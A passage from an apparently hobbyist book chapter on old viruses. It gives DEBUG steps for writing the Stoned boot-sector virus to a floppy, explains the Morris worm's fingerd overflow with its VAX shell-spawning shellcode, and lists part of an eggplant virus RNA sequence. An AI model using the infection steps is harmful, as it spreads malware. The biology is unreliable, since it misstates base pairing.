  <p class=Panel style='border:none;padding:0in'>  mov cx,0003</p>
  <p class=Panel style='border:none;padding:0in'>  mov dx,0100</p>
  <p class=Panel style='border:none;padding:0in'>  int 13</p>
  <p class=Panel style='border:none;padding:0in'>  ret</p>
  <p class=Panel style='border:none;padding:0in'>&lt;enter&gt;</p>
  <p class=Panel style='border:none;padding:0in'>- G</p>
  <p class=Panel style='border:none;padding:0in'>- Q</p>
  </div>
  </td>
 </tr>
</table>

</div>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>The ‘L’ command loads the bootsector into the current
segment at offset 200. Next, you use the ‘A’ command to assemble a small
program fragment. The assembler will assemble your program at offset 0100 by
default. (This is a throw-back to the days when COM files were common. COM
files have one segment and load just above their 256-byte Program Segment
Prefix). The ‘G’ command executes the program you just entered.</p>

<p class=MsoNormal>Next, you must get a binary version of the Stoned virus. The
easiest way is to use DEBUG to enter the values directly from the disassembly
above into memory in the current segment at offset 0100. Remember that my
listing shows words with the bytes in readable-order. You must reverse the
byte-order of all four-digit numbers in the above listing as you enter them
into memory.</p>

<p class=MsoNormal>You might want to enter the bytes into a text-file and write
a C parser to convert the ASCII into a binary file. I tested this approach, and
the single-byte-tally checksum of the program is 189 (BD in hex). No matter
which technique you use, you should be able to type at least two digits byte
every five seconds. At that rate, you can punch in the virus from the listing
in about 40 minutes.</p>

<p class=MsoNormal>The DEBUG session below shows how to load the virus from a
binary file named A:\STONED.BIN into the current segment at offset 0100. We can
then use the DEBUG ‘W’ command to write the virus into the bootsector of drive
0 (the floppy).</p>

<p class=MsoNormal>&nbsp;</p>

<div>

<table cellspacing=0 cellpadding=0 hspace=0 vspace=0 align=left>
 <tr>
  <td valign=top align=left style='padding-top:9.35pt;padding-right:9.35pt;
  padding-bottom:9.35pt;padding-left:9.35pt'>
  <div style='border:solid windowtext 1.0pt;padding:1.0pt 4.0pt 1.0pt 4.0pt'>
  <p class=Panel style='border:none;padding:0in'>&gt;debug a:\stoned.bin</p>
  <p class=Panel style='border:none;padding:0in'>- W 100 0 0 1</p>
  <p class=Panel style='border:none;padding:0in'>- Q</p>
  </div>
  </td>
 </tr>
</table>

</div>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>Congratulations! You now have a floppy infected with the
Stoned virus. I booted from the floppy on an old 286 machine I keep around the
house for just such experiments. (It is almost an archeological find in
itself). After several boots, I got the signature Stoned message, and I used
DEBUG to look at the bootsector of the C: drive. Sure enough, the virus was
there. I formatted a new floppy in the A: drive and used DEBUG to look at its
bootsector – there was the virus as expected, alive again after all these
years. </p>

<h2>Virus Protection</h2>

<p class=MsoNormal>Now that we have seen a little of how computer viruses work,
we can consider how to protect against them. Several methods come to mind, all
with specific advantages – all with specific drawbacks.</p>

<p class=MsoNormal>The sure-fire way to spot a virus is to have each program
run a check itself when started. The first thing the program does is to run a
checksum on the disk image to be sure nothing has been tampered with. Of
course, by the time the program gets to its checking routine, the virus has
already invaded the system. Assuming every program on your computer performs
the check, you will know the moment your computer gets infected. But cleaning
the infestation is another matter.</p>

<p class=MsoNormal>A better way to protect your machine, and the way the PC
world has gone, is to design a program to scan other programs looking for
viruses. Scanners from vendors like McAfee and Norton look through your
computer’s programs for the footprints of known viruses. Once a virus has been
identified, the scanner knows how to clean the specific virus from the infected
program. The drawback here is that the scanner can only identify “known”
viruses. You have to get periodic updates from the vendor and hope you don’t
stumble across a new virus before the vendor does.</p>

<p class=MsoNormal>Of course you could always do as the big-time UNIX
workstations have done and design your hardware to protect certain areas of
memory against writes (or reads). Thus, only the operating system can get
access to critical data structures. Normal programs are assigned segments of
memory, and an attempt to access memory outside the allocated area results in a
hardware Segmentation Violation (or a General Protection Fault if you are using
the latest Microsoft OS). It is physically impossible for a virus to do damage
to the memory assigned to other programs or to the kernel. The drawback here is
complexity and ultimately cost; you have to build a fool-proof operating system
that exploits special hardware capabilities – capabilities that made it into
the Intel line of processors after DOS was firmly established. As we will see
next, even the cleverest of operating system designs can be full of holes.</p>

<h1>The Internet Worm</h1>

<p class=MsoNormal>Even UNIX-workstations, with all their security measures,
are not immune to the computer virus. On November 2<sup>nd</sup>, 1988 the
famous Internet Worm accidentally escaped author Morris's clutches before he
had finished it. The worm was supposed to spread as a single, tiny process
running in the background of each infected machine. Instead, the premature
version proliferated on each machine quickly consuming all available CPU resources.
In less than four days the virus brought over 60,000 machines to their knees.</p>

<p class=MsoBodyTextIndent>The virus exploited several holes in the UNIX
operating system. One particular hole, a tiny anomaly in the <b><span
style='font-family:"Courier New"'>gets()</span></b> library call, allowed the
virus to create a root shell on a remote machine! Let’s dig into that hole more
closely.</p>

<p class=MsoNormal>Most C programmers are familiar with the C library call <b><span
style='font-family:"Courier New"'>gets(char *buffer)</span></b>, which reads a
line of text from the standard input (normally the keyboard) into the supplied <b><span
style='font-family:"Courier New"'>buffer</span></b>. But what happens if the
line is too long to fit in the buffer? The library has no way of knowing how
big the buffer is, and it blindly writes over whatever memory is beyond the
end. If the buffer is at the end of a segment, you get a segmentation
violation. If the buffer is on the stack, you overwrite the stack frame – which
is what happened in the case of the worm.</p>

<p class=MsoNormal>Programs written in C use the stack to create local
variables upon entry to a function. (Storage that is <b><span style='font-family:
"Courier New"'>malloc</span></b>ed or <b><span style='font-family:"Courier New"'>new</span></b>ed
comes from another area of the process memory called the heap.) Stacks grow
from the bottom of the address space upwards towards the heap, which is growing
downwards towards the stack. When a C program makes a call from function A to
function B, the return address (the pointer to the next statement in function
A) is pushed onto the stack. Then function B creates its variables on the stack
and begins to do whatever function B does. At the end of the function, the
local variables for B are pulled from the stack, and the CPU uses the return
address to continue in function A.</p>

<p class=MsoNormal>Since the stack builds “backwards”, a buffer-overflow on the
stack overwrites variables defined earlier. But worst of all, a buffer-overflow
on the stack overwrites the return address of the calling function. When the
CPU tries to unwind the stack, it finds itself returning to a bogus location. A
bogus location at best – a clever programmer could plan the overwrite to return
the CPU to another section of code, say a tiny program fragment embedded in the
buffer overflow. A clever programmer could do this, if he of she could gain
access to a running program that uses <b><span style='font-family:"Courier New"'>gets()</span></b>
to fill a stack buffer!</p>

<p class=MsoNormal>A program called <b><span style='font-family:"Courier New"'>inetd</span></b>
runs in the background of a UNIX workstation and listens for connection
requests on several “well known” ports (see <b><span style='font-family:"Courier New"'>/etc/services</span></b>).
When a remote program connects to port 79, <b><span style='font-family:"Courier New"'>inetd</span></b>
launches the <b><span style='font-family:"Courier New"'>fingerd</span></b>
program to serve the incoming finger request. (<b><span style='font-family:
"Courier New"'>Fingerd</span></b> returns harmless information like what a
specific user’s real name is.) <b><span style='font-family:"Courier New"'>Inetd</span></b>
creates a socket for the communication and connects it to the standard
input/output of the new process allowing <b><span style='font-family:"Courier New"'>fingerd</span></b>
to communicate with the client using the standard I/O routines – like <b><span
style='font-family:"Courier New"'>gets()</span></b> –  as if the were simply
talking to the console. When <b><span style='font-family:"Courier New"'>fingerd</span></b>
finishes its work, it terminates in the usual way by returning from main.</p>

<p class=MsoNormal>The virus connects to <b><span style='font-family:"Courier New"'>inetd</span></b>
on the target machine. The <b><span style='font-family:"Courier New"'>inetd</span></b>
server spawns <b><span style='font-family:"Courier New"'>fingerd</span></b> to
handle the request attaching the network socket to the standard I/O. The <b><span
style='font-family:"Courier New"'>main</span></b> routine of <b><span
style='font-family:"Courier New"'>fingerd</span></b> is called – the normal
return from <b><span style='font-family:"Courier New"'>main</span></b> is
pushed onto the stack. Then the local variables for <b><span style='font-family:
"Courier New"'>main</span></b> are pushed onto the stack. These include a
fixed-size buffer for reading the request from the input stream. Next <b><span
style='font-family:"Courier New"'>main</span></b> reads a line of text from the
standard input (coming from the virus) into the stack-buffer and looks up the
given user name. <b><span style='font-family:"Courier New"'>Main</span></b>
sends the fetched “finger” information back to the virus and terminates – or
rather it tries to terminate – by popping the return address from the stack.</p>

<p class=MsoNormal>The source code for <b><span style='font-family:"Courier New"'>fingerd</span></b>
is readily available, and Morris knew exactly what the stack frame looks like.
The virus sends a carefully constructed string of 536-bytes to the <b><span
style='font-family:"Courier New"'>fingerd</span></b> process that overflows the
stack-buffer spilling into the other local variables and the return address on
the stack. The string includes a tiny binary program fragment (shown below)
that lies safely at the end of the input buffer. The return address is
overwritten with the address of the program in the buffer. When the <b><span
style='font-family:"Courier New"'>fingerd</span></b> process finishes and
attempts to return normally from <b><span style='font-family:"Courier New"'>main</span></b>,
the CPU jumps to the program fragment instead! Quite clever.</p>

<p class=MsoNormal>What does the fragment do? It simply performs the function <b><span
style='font-family:"Courier New"'>execve(“/bin/sh”,0,0)</span></b> which
abandons the currently running code and loads a new program – in this case an
interactive shell that inherits the file descriptors of the dying program. In
other words, the <b><span style='font-family:"Courier New"'>fingerd</span></b>
server turns into a shell whose input is attached to the virus on the remote
machine. The virus is free to send standard UNIX commands to the shell, and
since <b><span style='font-family:"Courier New"'>fingerd</span></b> runs as
root, the new shell is a root shell with unrestricted access to the local
machine.</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>A program downloaded like this is very machine-dependant.
The author could have constructed other binary fragments to be sent to <b><span
style='font-family:"Courier New"'>fingerd</span></b> servers on other platforms
(like SUNs), but for some reason he only assembled the VAX version. The virus
could use several methods of attack, but this particular method worked only on
VAXes.</p>

<p class=MsoNormal>In the end, the guard against the <b><span style='font-family:
"Courier New"'>gets()</span></b> hole was easy to make. <b><span
style='font-family:"Courier New"'>Fingerd</span></b> was simply re-written
using <b><span style='font-family:"Courier New"'>fgets()</span></b>, which
allows the length of the buffer to be passed in. How a function like <b><span
style='font-family:"Courier New"'>gets()</span></b> made it into the
standardized C library is a mystery.</p>

<b><i><span style='font-size:12.0pt;font-family:"Arial","sans-serif"'><br
clear=all style='page-break-before:always'>
</span></i></b>

<h2>Code Walkthrough</h2>

<div>

<table cellspacing=0 cellpadding=0 hspace=0 vspace=0 align=left>
 <tr>
  <td valign=top align=left style='padding-top:9.35pt;padding-right:9.35pt;
  padding-bottom:9.35pt;padding-left:9.35pt'>
  <div style='border:solid windowtext 1.0pt;padding:1.0pt 4.0pt 1.0pt 4.0pt'>
  <p class=Panel style='border:none;padding:0in'>; VAX binary code fragment
  from the Morris Internet Worm.</p>
  <p class=Panel style='border:none;padding:0in'>; Downloaded to the fingerd
  serving process via the gets() hole.</p>
  <p class=Panel style='border:none;padding:0in'>; Performs
  execve(“/bin/sh”,0,0)</p>
  <p class=Panel style='border:none;padding:0in'>pushl  $0068732f     ; last
  half of name: &quot;/sh\0&quot;</p>
  <p class=Panel style='border:none;padding:0in'>pushl  $6e69622f     ; first
  half of name: &quot;/bin&quot;</p>
  <p class=Panel style='border:none;padding:0in'>mov    sp,r10        ; pointer
  to the string</p>
  <p class=Panel style='border:none;padding:0in'>pushl  $0            ; 3rd
  parameter: environment = null</p>
  <p class=Panel style='border:none;padding:0in'>pushl  $0            ; 2nd
  parameter: args = null</p>
  <p class=Panel style='border:none;padding:0in'>pushl  r10           ; 1st
  parameter: pointer to the executable name</p>
  <p class=Panel style='border:none;padding:0in'>pushl  $3            ; 3
  parameters on the stack</p>
  <p class=Panel style='border:none;padding:0in'>movl   sp,ap         ;
  ArgumentPointer points to arguments</p>
  <p class=Panel style='border:none;padding:0in'>chmk   $3b           ;
  SoftwareException 0x3B = EXECVE call</p>
  </div>
  </td>
 </tr>
</table>

</div>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>The first two pushes create a single string on the stack
(which happens to be exactly eight bytes, two <b><span style='font-family:"Courier New"'>long</span></b>s).
This string, &quot;/bin/sh&quot;, is the filename to load in the <b><span
style='font-family:"Courier New"'>execve()</span></b> call.</p>

<p class=MsoBodyTextIndent>We can tell a little about the VAX architecture from
this string. The ASCII characters are encoded backwards in the hexadecimal
constant. In order to arrange the string correctly in memory, the little end
has to be written first - the VAX is a Little-Endian (like the PC).</p>

<p class=MsoNormal>The next instruction, the MOV instruction, records the stack
pointer in R10. This looks backwards with the destination, R10, on the right
side of the comma. This is the way VAX assembler (and most RISC assembler) is
written.</p>

<p class=MsoNormal>The next three instructions push the arguments for <b><span
style='font-family:"Courier New"'>execve()</span></b> onto the stack in reverse
order: first the environment-block and the command-line argument-list (null
pointers) and then the pointer to the filename string.</p>

<p class=MsoBodyTextIndent>The &quot;pushl $3&quot; pushes the value 3 onto the
stack. This indicates the number of parameters that are being passed in the
function call (some functions take a variable number of parameters). Next, the
AP (the argument pointer) is set to point to the first parameter on the stack.
Why not use the stack pointer as pointer to the arguments? Because the stack
pointer is about to change as context information is pushed onto the stack with
the software exception call.</p>

<p class=MsoNormal>The last instruction is the software-exception. It is
similar to the PC software-interrupt in that it looks up a vector (vector 3B)
in a table of jumps, but much more happens under the sheets. The CPU goes from
USER mode to KERNEL mode giving the hardware permission to access resources
that “normal code” cannot touch. Only the KERNEL mode can access the vector
table, which prevents a virus from “hooking” into a system call.</p>

<p class=MsoNormal>Remember the filename string that got pushed onto the stack
first? Where does it get removed? Normally, the instructions following the CHMK
would have to clean the stack. However, this system call is an <b><span
style='font-family:"Courier New"'>execve()</span></b> call, which starts a new
program. There is no next-instruction for this program! The string is cleaned
when the original process is torn down.</p>

<p class=MsoNormal>&nbsp;</p>

<h1>The Eggplant Mosaic Virus</h1>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoBodyTextIndent>We’ll close this chapter by looking at the complete
code for another virus – this time a biological virus! Like its computer
counterparts, the Eggplant Mosaic Virus (EMV) is very platform specific; it
only runs on eggplants. The genetic code for the EMV is fairly small with only
6,331 base-pairs of nucleotides coding just three proteins.</p>

<p class=MsoNormal>Computer code is organized in long strings of opcodes.
Genetic code is organized in long, twisty ladders of nucleotides. A computer
bit is either a 1 or a 0. Nucleotides come in four flavors: Adenine, Thymine,
Cytosine, and Guanine. These are usually abbreviated with their first letters,
G, A, T, and C. (The title of the 1997 movie GATTACA is nothing more than a
genetic sequence.) Each rung of the genetic ladder is composed of two
nucleotides, but there are only two possible combinations. Adenine always pairs
with Guanine. Cytosine always pairs with Thymine. If the ladder is ever ripped in
half down the middle, each base pair attracts molecules of its mating type
restoring both sides of the ladder completely. This is, in fact, how DNA
replicates.</p>

<p class=MsoNormal>The ladder is nothing more than the blueprint of protein
molecules. Every living cell has a number of tiny 10 nanometer CPUs, called
ribosomes, that read the ladder from start to finish like a computer program.
(The ladders are kept protected in the central database of the cell – the
nucleus.) A ribosome reads three rungs at a time using the code to select a
specific amino acid. Three more rungs are read, and another amino acid is
linked to the first. Then another three, and then another until a protein
molecule has been built from the blueprint.</p>

<p class=MsoNormal>The ribosome doesn’t always start with rungs 1, 2, and 3. It
could start with 2, 3, and 4. It could start with 3, 4, and 5. In fact, it
could start at either end of the chain. Thus there are three overlapping
forward reading frames and three overlapping reverse reading frames. If the
parser starts at nucleotide 1, it generates one protein. If it starts at 2, it
might build an entirely different protein. Two proteins like this on the
genetic ladder are said to be overlapping and out-of-phase. The EMV contains
such a protein.</p>

<p class=MsoNormal>Let’s attempt a code walk through for the EMV! The genetic
code describes three proteins. Base-pairs (rungs) 102-2051 describe the
overlapping out-of-phase protein – the movement protein. This protein probably
helps the virus spread from cell to cell. Base-pairs 109-5628 describe the replicase
protein. This protein is responsible for replicating the genetic code ladder.
Base-pairs 5633-6199 describe the viron protein. Several of these proteins
huddle together to form a protective 30 nanometer diameter icosahedral bubble
around the fragile genetic code ladder.</p>

<p class=MsoNormal>We’ll pick up the virus’s lifecycle inside an infected
eggplant. A beetle eats part of the plant lodging several spherical viral seeds
in its jaws. It moves to a “clean” eggplant and begins eating again. Some of
the viral seeds are rubbed off the beetle’s jaws and enter the plant through
the damaged area. Once inside a healthy cell, the protein coat breaks open
releasing the genetic ladder. The cell’s own protein factory (a ribosome) picks
up the ladder and begins manufacturing the three proteins in mass quantities.
The replicase protein goes to work creating duplicates of the ladder. The viron
proteins (called capsid proteins) bind together around the new ladders creating
virus seeds – how this happens is not clearly understood. The movement protein
helps the seeds spread from cell to cell. Eventually, a hungry bug picks up the
virus seeds from the newly infected plant, and the whole cycle repeats.</p>

<p class=MsoNormal>As computer archeologists, we are used to seeing code that
can be understood in terms of concrete sets of actions. We look at a series of
instructions and uncover the algorithm that the code implements. But genetic
code is seemingly much simpler! There is no clearly discernable algorithm; a
genetic ladder is basically a set of “pictures” of protein molecules. Within
living cells, protein factories flip through the picture albums and create what
they see. Yet somehow algorithms are encoded – it boggles the mind to think
that a sequence of protein productions could somehow encode the step-by-step procedures
to turn a single cell into a living, human being.</p>

<p class=MsoNormal><span style='font-size:6.0pt;font-family:"Courier New"'>&nbsp;</span></p>

<div style='border:solid windowtext 1.0pt;padding:31.0pt 31.0pt 31.0pt 31.0pt'>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>Eggplant Mosaic Virurs</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>ssRNA Positive-strand Sequence</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>Printed with permission of: TOPHER</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>URL: TOPHER</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>&nbsp;</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>BASE COUNT     1337 a   2441 c    987 g   1566 t</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>ORIGIN      </span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>        1 gtaatcagaa ccagaactaa ccctgttatc
agccttagtt cttttacttt cctgtccaaa</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>       61 tttctgaacc gactagtgcc ttcctagaac
ccactacgtc aatgcctcat ggcctttcag</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>      121 tctgctctcg aagctctcaa ctcaactact
cacagagatg cttctacaaa tccaattctg</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>      181 aactccgtcg tggaacctct ccgcgactct
ctatccctat atccctggct ccttcccaaa</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>      241 gaagccgttc cccaccttct atcctggggc
atcccgaact ccggcctcgg agtcactccc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>      301 cacccccacc caatccacaa aacagtcgag
acttttctcc tgttcaatca ctggcatgct</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>      361 ctcgctcgcc tgccttcaac tgtgatgttc
atgaaaccgt ccaagtttca aaaacttgcg</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>      421 gctctaaacc caaaattcca agagttgatc
aactttcgac tcactgccgc cgacaccact</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>      481 cgctacccct ccacctcact cacttttcca
agcaattcaa tttgcttcat gcacgatgct</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>      541 ctgatgtact tttctccagc tcagatcgtc
gatctcttca ctcagtctcc cgcactcgag</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>      601 accctgtact gcagtctcat agtgcctcca
gagtctcatt tcacagatct ctctctcttc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>      661 cccgagatct acacttacaa gatctcaggt
cagactctcc actacatccc ggagaatcac</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>      721 cactccggct cgtacaatca gcccctccaa
gccccatctt ggctgaagat ttcctccatc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>      781 ctctcgcctt ccctcgcttt gtctgtgacc
aagctggaat cttggggccc agtccactcc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>      841 atattgatcc agcgaggcct accaccaaag
ccctctctct ctgcacgccc ccccgtcctg</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>      901 ccaaatcaac ctccccgtgc aacaactccc
aactcccaaa accaactgct gcatcagaca</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>      961 agccagctat tcttccaact gcagcagcct
caactcagcc tggtctcctt ccgaattcca</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     1021 gactgcgtag aactgccaca agccaccttt
ctgcgccaac ctctccgcca ccggctagtg</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     1081 ccaacaagcg tttacaacgc tctcttcacc
tacactcgcg cagtccgcac tcttcgcact</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     1141 tccgacccag ccggatttgt gcgaactcaa
agcaacaaac ccgagcacgc ttgggtcact</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     1201 ccaaacgcgt gggacaatct gcagaccttg tctgtcaatg
ccccccaccg cccccaagta</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     1261 tgctaccact tcttctcctc ccccgtggca
aggttaaagc tccacttcgc ccaacactgg</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     1321 cgagcctatc ttttggctct caccccattc
cttaccacgt cacctcttct cctcccctta</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     1381 ttcaatttca acaccccttt ccccctccct
cggctacttt ctctgtttcg ccgctcggtg</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     1441 tcctcaccac ggcttttgca ctcaatccta
cccagtcagc tgagaggagc tgcgatcccg</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     1501 aatcgcccac tcccactctg ggtcacaaaa
ctacatcact ttctcgactc ccactccctc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     1561 ctccccactc cccccattcg gcccaggata
gagcttcagc gcttgccact gatgtctcta</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     1621 attccgaaac caaaaattgt ccttccccta
ctgtccctcc tcctttcctc cccaaccatc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     1681 tacatccact tcttccaggc acagaccccc
caacaactcc acgacaatta tcaccttcac</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     1741 cttcatccct ctcgcttcga actttcctgg
actctgcagt catatcatgt gactcaagcc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     1801 cagtccttcc tccctctcct tctcccagct
cccactcaag ctcaagcttc caatcctgca</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     1861 cctcgccccc ccgctttcca tgctatcccc
ctcccccctc agccctcgac ctcctcttct</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     1921 cctccactcc aggaaccgac cctttccccc
cacctgatac acccccccct cacaagagaa</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     1981 ccatcgccct tgaacggctg cgcctgcgac
agtgcgctac tcccttccac agctgcgatg</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     2041 acgtctgctg aacatcccac tccactcaac
ccccccacac ctagcccaac accagacgtc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     2101 cctcctcccg actcacccgg taacccatca
cttttgaagc aagtccctcc cgaagcgaac</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     2161 ttgcatccta tccacaaccc agacctcccc
tcttccacca ctcttccttc tggggccctg</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     2221 acactggtcc cagccaaaac tccttccatc
tacgccaatc ccaccccccc cagttcccat</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     2281 ccgttcaccc cactggctga tgaccccact
gctgtgggtc cttgcctacc gttccacgtt</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     2341 ctccacccgg ctgactactt tcctctttca
gccgagtttc tcacacggac ccggcatgtc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     2401 cccccctctt ctctctcaca tccaaaactc
aattgcctac tcacctgctt ttctgaactt</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     2461 tcaggacact ctgagtcaga tctttggttg
tccctgcaat caatacttcc tgactcccaa</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     2521 ctccaaaatc ctgaagtctc gacacttggc
ctgtccactg acattctcac agctctctgc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     2581 ttcatctacc attcatctgt gactctccat
gccccctcag gagtttatca ctacggcata</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     2641 gcctcctctt ctaccgtcta tgtcatccac
tatcaaccag gccctcctcc tcatttttct</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     2701 ctctccccta gacttgccgc ttctgctcct
cgctgcaacc ccaccaacag cagattggtc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     2761 agacaagctc tgcggtttaa attgaacggc
gagtttctcc ccttcaccca ggcttacgcg</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     2821 catgaatctt ccatcaccca tgccaaaaac ctcatctcca
acatgaagaa tggttttgat</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     2881 ggaatcatgt cttctctcac tgactcctct
aagggtccct ccccccgtga aaaactgacc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     2941 actctcgact ctctcataga tgtcgctgcc
cctcgcgaag tttctctcat ccacatcgcc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     3001 ggcttcgcag gctgcggcaa gacccacccc
atccaaaaac tcctccaaac ttcccctttt</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     3061 cacgacttcc gaatctcatg ccccactaat
gaactccgat ccgaatggaa gcgtgatatg</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     3121 caaccaacag ctgaaaatgt ttggaggttc
tccacatggg aatccagcct gctcaaacat</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     3181 tccgagatcc tcgtaatcga cgagatttac
aagctccctc gtggctacct agatctctcc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     3241 atccttgctg atccaactct ctccttggtc
atcatccttg gtgaccctct ccaaggagag</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     3301 tatcactcga cctctcctca cagctccaat
cactttcttc caagtgaggt ccaccgcttc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     3361 aagtcttaca tcgactgcta ctgtttttgg
tcccaccgca ttccaaagca gatagcatcc</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     3421 ttgttcggcg tagtatgcca caacacgaac gaaggtttcg
tgagagccct cacatctcat</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     3481 ccccccaatt ccaaaaacct caccaatgcg
accaacactg ctctcagtct ccaacagatg</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     3541 ggccaccacg ctatcaccat cagcgccaga
agggtcacct tcaccgaggc ccatacaatt</span></p>

<p class=MsoNormal style='border:none;padding:0in'><span style='font-size:6.0pt;
font-family:"Courier New"'>     3601 ctgcttgatc gtcataccaa ccttctctcc
cccaacaact gtcttgttgc cctcacccgc</span></p>

